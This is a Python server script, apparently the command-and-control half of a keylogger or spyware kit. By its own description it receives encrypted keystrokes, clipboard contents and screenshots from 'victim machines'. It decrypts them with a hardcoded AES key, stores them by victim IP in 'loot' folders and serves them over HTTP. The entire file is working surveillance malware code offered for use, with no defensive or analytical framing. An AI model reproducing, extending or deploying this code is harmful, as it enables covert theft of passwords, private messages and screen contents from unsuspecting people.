# --- SERVER.PY --------------------------------------------------------------------- #
# This script receives encrypted keyboard inputs, clipboard contents, and screenshots #
# from victim machines (client.py). It decrypts the data and saves it to files.       #
# ----------------------------------------------------------------------------------- #

import socket
import threading
import os
import base64
import struct
import http.server
import socketserver
import time
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# --- CONFIGURATION SETTINGS -------------------------------------------------------------------------------- #
SECRET_KEY     = b'w\xd7\xc9=0\x17\xd1{\xe3\xc7{\x1a"\x8d\xa7\xb19\x87e\xb7gTQ\x98R\xed\xf2\x90\xbc\xfb2\xd2' #
IV             = b'\xed>\x86\x98\xed\xe5%\x99\x91\xe9r\x8b\t\xe3\xf2\xd2'                                     #
HOST, PORT     = '0.0.0.0', 43558                                                                             #
LOOT_DIR       = 'loot'                                                                                       #
SCREENSHOT_DIR = os.path.join(LOOT_DIR, 'screenshots')                                                        #	
KEYSTROKE_DIR  = os.path.join(LOOT_DIR, 'keystrokes')                                                         #
CLIPBOARD_DIR  = os.path.join(LOOT_DIR, 'clipboard')                                                          #
HTTP_PORT      = 26954  # HTTP file server port to download tools.zip                                         #
# ----------------------------------------------------------------------------------------------------------- #


def timestamp():
    """
    Returns the current date and time in 'YYYY-MM-DD HH:MM:SS' format.
    """
    return datetime.now().strftime('%Y-%m-%d %H:%M:%S')


def decrypt_data(b64cipher):
    """
    Decrypts a Base64-encoded AES-CBC encrypted payload.
    :param b64cipher: Base64-encoded ciphertext
    :return: Decrypted plaintext string
    """
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)
    data = cipher.decrypt(base64.b64decode(b64cipher))

    return unpad(data, AES.block_size).decode('utf-8', errors='ignore')


def recv_exact(conn, n):
    """
    Receives exactly n bytes from the socket.
    :param conn: Active socket connection
    :param n: Number of bytes to read
    :return: Bytes object of length n
    :raises ConnectionError: If connection closes prematurely
    """
    buf = b''

    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connection closed while receiving data")
        buf += chunk

    return buf


def handle_connection(conn, addr):
    """
    Processes incoming data from a single client connection.
    Decrypts and parses each message, then writes to appropriate files:
      - IMG|<ts>|<b64>: saves JPEG to loot/<ip>/
      - CLP|<ts>|<b64>: appends clipboard to loot/<ip>_clipboard.txt
      - KEY|<ts>|<keys>: appends keystrokes to loot/<ip>.txt
    """
    ip = addr[0]
    # Directory for this client's screenshots
    img_dir = os.path.join(SCREENSHOT_DIR, ip)
    os.makedirs(img_dir, exist_ok=True)

    try:
        while True:
            # Read length prefix then ciphertext
            raw_len = recv_exact(conn, 4)
            msg_len = struct.unpack('>I', raw_len)[0]
            encrypted = recv_exact(conn, msg_len)

            # Decrypt and parse
            try:
                payload = decrypt_data(encrypted)
            except Exception as e:
                print(f"[!] {timestamp()} : Decrypt error from {ip}: {e}")
                continue

            # Route by prefix
            if payload.startswith('IMG|'):
                _, ts, b64 = payload.split('|', 2)
                img_bytes = base64.b64decode(b64)
                filename = f"{ts.replace(':', '-')}.jpg"
                path = os.path.join(img_dir, filename)
                with open(path, 'wb') as f:
                    f.write(img_bytes)
                print(f"[+] {timestamp()} : Saved image to {path}")

            elif payload.startswith('CLP|'):
                _, ts, b64 = payload.split('|', 2)
                clip = base64.b64decode(b64).decode('utf-8', errors='ignore')
                path = os.path.join(CLIPBOARD_DIR, f"{ip}.txt")
                with open(path, 'a', encoding='utf-8') as f:
                    f.write(f"{ts}: {clip}\n")
                print(f"[+] {timestamp()} : Saved clipboard to {path}")

            else:
                # Handles KEY| and legacy TXT| prefixes
                parts = payload.split('|', 2)
                if parts[0] in ('KEY', 'TXT') and len(parts) == 3:
                    _, ts, keys = parts
                    line = f"{ts}: {keys}\n"
                else:
                    # Unexpected format; log raw
                    line = payload + '\n'
                path = os.path.join(KEYSTROKE_DIR, f"{ip}.txt")
                with open(path, 'a', encoding='utf-8') as f:
                    f.write(line)
                print(f"[+] {timestamp()} : Saved keystrokes to {path}")

    except (ConnectionError, OSError):
        # Client disconnected or IO error; close and exit
        pass

    finally:
        conn.close()


def start_http_server():
    """
    Launches a simple HTTP server for browsing loot files.
    """
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer((HOST, HTTP_PORT), handler) as httpd:
        print(f"[*] {timestamp()} : HTTP server running on port {HTTP_PORT}")
        httpd.serve_forever()


def main():
    """
    Main entry: sets up directories, starts HTTP server, and begins listening
    for incoming encrypted data connections.
    """
    # Ensure loot directories exist
    os.makedirs(LOOT_DIR, exist_ok=True)
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    os.makedirs(KEYSTROKE_DIR, exist_ok=True)
    os.makedirs(CLIPBOARD_DIR, exist_ok=True)

    # Start HTTP file server (daemon thread)
    threading.Thread(target=start_http_server, daemon=True).start()
    time.sleep(1)  # Give HTTP server time to bind

    # Set up TCP listener for client payloads
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()
        print(f"[*] {timestamp()} : Listening on {HOST}:{PORT}")

        try:
            while True:
                conn, addr = s.accept()
                # Spawn thread to handle this client
                threading.Thread(target=handle_connection,
                                 args=(conn, addr), daemon=True).start()
        except KeyboardInterrupt:
            print(f"\n[!] {timestamp()} : Server shutting down...")


if __name__ == '__main__':
    main()
